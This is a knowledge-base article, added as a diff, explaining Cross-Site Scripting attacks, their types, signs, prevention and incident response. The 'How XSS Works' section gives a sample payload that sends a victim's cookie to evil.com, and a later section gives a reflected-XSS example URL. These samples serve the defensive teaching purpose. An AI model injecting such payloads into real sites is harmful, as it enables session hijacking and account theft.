@@ -1,0 +1,70 @@
+Cross-Site Scripting (XSS) Attack - Cybersecurity Knowledge Base
+
+Cross-Site Scripting (XSS) is a web security vulnerability that allows attackers to inject malicious JavaScript or HTML into web pages viewed by other users. XSS consistently ranks in the OWASP Top 10. When a victim's browser executes the injected script, the attacker can steal session cookies, redirect users, log keystrokes, deface websites, or perform actions on behalf of the victim without their knowledge.
+
+How XSS Works:
+1. Attacker finds an input field (comment box, search bar, URL parameter, user profile) that displays output without proper encoding.
+2. Attacker injects a malicious script:
+   <script>document.location='https://evil.com/steal?c='+document.cookie</script>
+3. The web application stores (Stored XSS) or reflects (Reflected XSS) this script back to users.
+4. When victim loads the page, their browser executes the script thinking it came from the trusted site.
+5. Attacker receives the victim's session cookie and uses it to hijack their authenticated session.
+
+Types of XSS:
+1. Stored XSS (Persistent XSS): Malicious script is permanently stored in the database (comments, profiles, forum posts). Executes for every user who views the infected page. Most dangerous — can affect thousands of users simultaneously.
+2. Reflected XSS (Non-Persistent): Script is embedded in a URL and reflected in the response. Victim must click the malicious link. Often used in phishing emails.
+   Example URL: https://example.com/search?q=<script>alert(document.cookie)</script>
+3. DOM-Based XSS: Vulnerability exists entirely in client-side JavaScript. Server never sees the payload. The script reads attacker-controlled data from URL fragments (#) or localStorage and writes it to the DOM unsafely using innerHTML or document.write().
+4. Blind XSS: Payload executes in a different context — like an admin dashboard that displays user-submitted data. Attacker uses out-of-band notification (DNS, HTTP request) to know when payload fires.
+5. Self-XSS: Social engineering attack where victims are tricked into pasting malicious JavaScript into their own browser console ("paste this to unlock a feature").
+6. XSS via SVG/PDF/XML: Malicious scripts embedded in file uploads (SVG images, PDF files) that execute when opened.
+
+What Attackers Can Achieve:
+- Session hijacking: Steal session cookies and impersonate authenticated users.
+- Account takeover: Change email/password using the victim's authenticated session.
+- Credential harvesting: Inject fake login forms that send credentials to the attacker.
+- Keylogging: Record every keystroke on the page — captures passwords typed after the session is already authenticated.
+- Cryptocurrency mining: Inject cryptomining scripts that run in every visitor's browser.
+- Defacement: Modify the visible content of the web page.
+- Drive-by malware downloads: Redirect users to exploit kits that install malware.
+- XSS worms: Self-propagating scripts that spread through social networks (Samy worm on MySpace infected 1 million accounts in 20 hours).
+- CSRF amplification: Use XSS to bypass CSRF protections and perform actions on behalf of users.
+- Internal network scanning: Use browser as a pivot to scan internal services not exposed to the internet.
+
+Signs of XSS Activity:
+- Unexpected pop-ups or alert boxes appearing on a legitimate website.
+- Users reporting being redirected to unknown websites from your application.
+- Session hijacking — users finding unauthorized actions or being suddenly logged out.
+- WAF alerts showing script tags, JavaScript keywords, or event handlers in request parameters.
+- Content Security Policy (CSP) violation reports.
+- Unusual requests to external domains appearing in server logs.
+
+Prevention Strategies:
+1. Output Encoding (Primary Defense): Encode all user-supplied data before rendering in HTML. htmlspecialchars() in PHP, HtmlEncoder in .NET, ESAPI in Java. Different encoding for different contexts: HTML, JavaScript, CSS, URL.
+2. Input Validation: Validate and reject inputs containing script tags, event handlers (onerror=, onclick=), or javascript: protocol.
+3. Content Security Policy (CSP): HTTP header that restricts which scripts can execute.
+   Header: Content-Security-Policy: default-src 'self'; script-src 'self' 'nonce-randomvalue'
+4. HttpOnly Cookie Flag: Prevents JavaScript from accessing session cookies.
+   Set-Cookie: session=abc123; HttpOnly; Secure; SameSite=Strict
+5. SameSite Cookie Attribute: Prevents cookies from being sent in cross-origin requests.
+6. Web Application Firewall (WAF): Detects and blocks XSS payloads.
+7. Avoid Dangerous JavaScript: Never use innerHTML, document.write(), eval(), or setTimeout() with user input.
+8. Use Modern Frameworks: React, Angular, Vue auto-escape output by default — significantly reduces XSS risk.
+9. Subresource Integrity (SRI): Verify integrity of external scripts to prevent CDN compromise.
+10. Regular Security Testing: DAST tools (OWASP ZAP, Burp Suite) and penetration testing.
+
+Incident Response:
+- Identify and remove the stored XSS payload from the database immediately.
+- Invalidate ALL active user sessions (force re-login) — sessions before patch may be compromised.
+- Notify affected users to change passwords and review account activity.
+- Patch the vulnerable input field with proper output encoding.
+- Add or tighten CSP headers as immediate defense-in-depth.
+- Review logs to determine scope: how many users were affected and for how long.
+- Check for persistence: did the attacker create backdoor admin accounts or API tokens?
+
+Real-World Examples:
+- Samy Worm (2005): MySpace XSS worm infected 1 million profiles in 20 hours.
+- 2011 Apache.org: Stored XSS in issue tracker allowed attacker to steal admin credentials.
+- 2014 eBay: XSS vulnerability allowed attackers to redirect users to phishing pages from within eBay.
+- 2019 British Airways: XSS-enabled Magecart attack skimmed 500,000 payment card details — £20 million GDPR fine.
+- 2022: Multiple cryptocurrency exchanges suffered XSS attacks targeting user session cookies.
